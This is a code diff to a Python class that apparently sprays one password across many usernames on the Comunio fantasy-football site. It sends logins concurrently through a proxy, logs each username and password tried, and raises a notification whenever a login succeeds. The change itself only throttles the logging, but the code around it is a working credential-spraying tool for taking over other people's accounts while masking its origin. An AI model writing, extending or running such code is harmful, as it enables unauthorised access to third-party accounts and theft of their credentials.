@@ -45,7 +45,6 @@ class Comunio(UserAccount):
     def login(self, password):
         """ requests given login data to the account
 
-        :return: None or request Response
         """
 
         # check if proxy is set
@@ -57,10 +56,11 @@ class Comunio(UserAccount):
                 with ThreadPoolExecutor(max_workers=len(self.usernames)) as executor:
 
                     future_response = {executor.submit(self.__request_login, user, password): user for user in self.usernames}
-                    for future in as_completed(future_response):
+                    for i, future in enumerate(as_completed(future_response)):
                         user = future_response[future]
                         statuscode = future.result().status_code
-                        self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
+                        if (self.request_counter % len(self.usernames)) == 0:
+                            self.logger.info("response code: {} from comunio with username: {}, password: {}, proxy: {}"
                                          .format(statuscode, user, password, self.session.proxies['http']))
                         if statuscode == 200:
                             self.send_notification(username=user, password=password)
